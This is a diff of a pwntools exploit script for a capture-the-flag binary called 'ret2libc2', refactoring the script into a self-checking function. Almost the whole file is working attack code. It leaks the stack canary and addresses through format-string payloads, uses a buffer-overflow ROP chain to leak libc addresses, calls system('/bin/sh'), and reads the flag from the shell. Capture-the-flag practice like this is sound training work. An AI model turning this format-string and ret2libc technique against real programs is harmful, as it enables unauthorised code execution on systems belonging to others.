@@ -6,7 +6,7 @@ from pwn import *
 
 # Set up pwntools for the correct architecture
 exe = context.binary = ELF(args.EXE or "../src/ret2libc2.debug")
-context.terminal = ['alacritty', '-e']
+context.terminal = ["alacritty", "-e"]
 
 # Many built-in settings can be controlled on the command-line and show up
 # in "args".  For example, to dump all data sent/received, and disable ASLR
@@ -68,7 +68,11 @@ username = "n1k0th3gr3@t"
 password = "cr1st1n@scks"
 
 
-def login(io: process | connect, _user: bytes = username.encode('ascii'), _pass: bytes = password.encode('ascii')):
+def login(
+    io: process | connect,
+    _user: bytes = username.encode("ascii"),
+    _pass: bytes = password.encode("ascii"),
+):
     io.recvuntil(b"> ")
     io.sendline(b"1")
     io.recvuntil(b"name: ")
@@ -87,62 +91,99 @@ def view_logs(io: process | connect) -> list[bytes]:
     raw = io.recvuntil(b"-- N1k0", drop=True)
     return raw.split(b"\n")
 
+
 def reap_logs(io: process | connect) -> list[str]:
     logs = view_logs(io)
-    logs = logs[1:-1] # removing initial login and junk final entry
-    return list(map(lambda x: x.decode('ascii').split("username ")[1].split(", password")[0], logs))
+    logs = logs[1:-1]  # removing initial login and junk final entry
+    return list(
+        map(
+            lambda x: x.decode("ascii").split("username ")[1].split(", password")[0],
+            logs,
+        )
+    )
+
 
 def exit_prog(io: process | connect):
     io.recvuntil(b"> ")
     io.sendline(b"3")
 
 
-# -- exploit --
-io = start()
-
-# real login
-login(io)
-
 ## fake logins to leak the stack
-#for i in range(1, 101, 5):
+# for i in range(1, 101, 5):
 #    io.info(f"Leaking stack vars {i} to {i + 5}.")
 #    payload = ".".join([f"{j}|%{j}$lx" for j in range(i, i +5)])
 #    login(io, payload.encode('ascii'))
 #
 ## leaking logs
 ##logs = list(map(lambda x: x.decode('ascii'), reap_logs(io)))
-#logs = reap_logs(io)
+# logs = reap_logs(io)
 #
-#for log in logs:
+# for log in logs:
 #    io.info(log)
 
-# stack var 65 contains the base address of main
-# stack var 43 contains the stack Canary
-# stack var 44 contains the rbp
-# stack var 45 contains main+341
-payload = '.'.join(["%43$lx", "%44$lx", "%45$lx"]) # canary, rbp, main+341
-login(io, payload.encode('ascii'))
-logs = reap_logs(io)[0].split('.')
 
-# assigning
-canary = int(logs[0], 16)
-rbp = int(logs[1], 16)
-exe.address = int(logs[2], 16) - exe.sym['main'] - 341
-assert exe.address & 0xfff == 0x0
+def exploit() -> bool:
+    io = start()
 
-# logging
-io.success(f"Obtained canary: {hex(canary)}")
-io.success(f"Obtained RBP: {hex(rbp)}")
-io.success(f"Obtained base address of binary: {hex(exe.address)}")
+    # real login
+    login(io)
 
-# ropping
-syms = ['puts', 'printf', 'fgets', 'exit', 'strftime']
-addrs = {}
-for sym in syms:
-    # creating the rop
-    rop = ROP(exe)
-    rop.puts(exe.got[sym])
-    rop.main()
+    # stack var 43 contains the stack Canary
+    # stack var 44 contains the rbp
+    # stack var 45 contains main+341
+    payload = ".".join(["%43$lx", "%44$lx", "%45$lx"])  # canary, rbp, main+341
+    login(io, payload.encode("ascii"))
+    logs = reap_logs(io)[0].split(".")
+
+    # assigning
+    canary = int(logs[0], 16)
+    rbp = int(logs[1], 16)
+    exe.address = int(logs[2], 16) - exe.sym["main"] - 341
+    assert exe.address & 0xFFF == 0x0
+
+    # logging
+    io.success(f"Obtained canary: {hex(canary)}")
+    io.success(f"Obtained RBP: {hex(rbp)}")
+    io.success(f"Obtained base address of binary: {hex(exe.address)}")
+
+    # ropping
+    syms = ["puts", "printf", "fgets", "exit", "strftime"]
+    addrs = {}
+    for sym in syms:
+        # creating the rop
+        rop = ROP(exe)
+        rop.puts(exe.got[sym])
+        rop.main()
+
+        # payload
+        payload = b"A" * 0x48
+        payload += pack(canary)
+        payload += pack(rbp)
+        payload += rop.chain()
+
+        # sending ROP
+        login(io, _pass=payload)
+
+        # executing rop
+        exit_prog(io)
+
+        # leaking address
+        addrs[sym] = unpack(io.recvuntil(b"\n", drop=True).ljust(8, b"\0"))
+        io.info(f"Leaked address of {sym}@libc {hex(addrs[sym])}")
+
+        # have to log in again
+        login(io)
+
+    # confirming libc
+    libc.address = addrs[syms[0]] - libc.sym[syms[0]]
+    for sym in syms:
+        io.debug(f"{sym}@libc: {hex(libc.sym[sym])} == {sym}@leak: {hex(addrs[sym])}")
+        assert libc.sym[sym] == addrs[sym]
+
+    # spawning a shell
+    rop = ROP(libc)
+    rop.raw(rop.ret)
+    rop.system(next(libc.search(b"/bin/sh")))
 
     # payload
     payload = b"A" * 0x48
@@ -156,36 +197,18 @@ for sym in syms:
     # executing rop
     exit_prog(io)
 
-    # leaking address
-    addrs[sym] = unpack(io.recvuntil(b"\n", drop=True).ljust(8, b'\0'))
-    io.info(f"Leaked address of {sym}@libc {hex(addrs[sym])}")
+    # enjoy the shell
+    io.sendline(b"cat flag.txt")
+    flag = io.recvuntil(b"\n", drop=True).decode("ascii")
 
-    # have to log in again
-    login(io)
+    # comparing to the actual flag
+    with open("./flag.txt", "r") as f_in:
+        buf = f_in.readline().strip()
+        if buf in flag:
+            io.success(f"Flag: {flag}")
+            return True
+        return False
 
-# confirming libc
-libc.address = addrs[syms[0]] - libc.sym[syms[0]]
-for sym in syms:
-    io.debug(f"{sym}@libc: {hex(libc.sym[sym])} == {sym}@leak: {hex(addrs[sym])}")
-    assert libc.sym[sym] == addrs[sym]
 
-# spawning a shell
-rop = ROP(libc)
-rop.raw(rop.ret)
-rop.system(next(libc.search(b"/bin/sh")))
-
-# payload
-payload = b"A" * 0x48
-payload += pack(canary)
-payload += pack(rbp)
-payload += rop.chain()
-
-# sending ROP
-login(io, _pass=payload)
-
-# executing rop
-exit_prog(io)
-
-# enjoy the shell!
-io.interactive()
-
+if __name__ == "__main__":
+    exit(exploit())
